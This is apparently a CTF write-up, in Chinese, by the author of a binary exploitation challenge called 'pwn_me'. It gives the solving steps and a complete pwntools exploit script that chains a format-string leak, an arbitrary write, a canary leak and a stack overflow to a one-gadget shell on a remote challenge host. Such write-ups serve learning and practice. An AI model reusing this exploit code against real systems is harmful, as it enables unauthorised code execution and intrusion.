### 一、pwn_me

这题是当初刚学完栈溢出时，心血来潮出的一道题，顺便复习一下学过的知识点。

1、修复壳，拖进010edit加上标志位UPX!

2、ubuntu下直接upx -d(有师傅的版本比较高，直接脱了，不用修复文件)

3、简单异或和base64的逆向解出来密码是[m]

4、接着爆破随机数，这里考察脚本书写能力，1/5概率

5、格式化字符串泄露程序基地址+任意地址写改那个全局标志值为0x77(有师傅在这里直接泄露了真实地址也行)

6、puts泄露出canary，接着栈溢出回跳一次puts又一次泄露出真实地址，然后栈溢出填onegadget直接getshell

7、这里需要注意栈上某些特定的字符不要直接覆盖了(ZXZl)

```python
#coding=utf8
from pwn import *
context.log_level = 'debug'
context(arch='amd64', os='linux')
local = 0
sl = lambda s : p.sendline(s)
sd = lambda s : p.send(s)
rc = lambda n : p.recv(n)
ru = lambda s : p.recvuntil(s)
ti = lambda : p.interactive()

def debug(addr,PIE=True):
    if PIE:
        text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(p.pid)).readlines()[1], 16)
        gdb.attach(p,'b *{}'.format(hex(text_base+addr)))
    else:
        gdb.attach(p,"b *{}".format(hex(addr)))

def bk(addr):
    gdb.attach(p,"b *"+str(hex(addr)))

i = 0
while True:
    i += 1
    print i
    if local:
        p = process('./pwn_me')
        libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    else:
        p = remote('183.129.189.60',10027)
        libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    ru("please input the secret key~")
    sl('[m]')
    ru("enter:")
    sl("1")
    word = p.recv(17)
    if "say something?: " in word:
        sd("%14$p")
        rc(1)
        base_addr = int(rc(14),16) - 0x195d - 0x10 + 0x30-0xf00+0x1000
        print "base_addr--->" + hex(base_addr)
        # debug(0)
        pop_rdi_ret = base_addr + 0x1763
        puts_got = base_addr + 0x000000000201F70
        puts_plt = base_addr + 0x0000000000009B0
        # debug(0)
        gg = base_addr + 0x202010
        py = ''
        py += "%" + str(0x77) + "c%8$hhn" + "aaaaa" + p64(gg)
        ru("again?")
        sd(py)
        ru("please input a magic: ")
        sl('624')
        ru("tell me your dream:\n")
        sd('a'*601) 
        ru('a'*601)
        canary = '\x00' + p.recv()[:7]
        print "canary---->" + hex(u64(canary))
        ret_main = 0xB60 + base_addr
        sl(str(2147483648))
        payload = 'a'*88
        payload += 'Z'
        payload += 'a'*38
        payload += 'X'
        payload += 'a'*9
        payload += 'Z'
        payload += 'a'*16
        payload += 'l'
        payload += 'a'*445
        payload += canary
        payload += 'aaaaaaaa'
        payload += p64(ret_main)
        ru("I think the magic should be 624 hhh")
        sl(payload)

        ru("please input a magic: ")
        sl('624')
        ru("tell me your dream:\n")
        sd('a'*624)
        ru('a'*624)
        
        main_addr = u64(ru('\x57\x68')[-9:-3].ljust(8,'\x00')) - 240
        print "__libc_start_main---->" + hex(main_addr)
        onegadget =  (main_addr - libc.sym['__libc_start_main']) + 0x45216
        print "onegadget---->" + hex(onegadget)
        sl(str(2147483648))
        ru("I think the magic should be 624 hhh")
        payload = 'a'*88
        payload += 'Z'
        payload += 'a'*38
        payload += 'X'
        payload += 'a'*9
        payload += 'Z'
        payload += 'a'*16
        payload += 'l'
        payload += 'a'*445
        payload += canary
        payload += 'aaaaaaaa'
        payload += p64(onegadget)
        sl(payload)
    else:
        p.close()
        continue
    p.interactive()
```

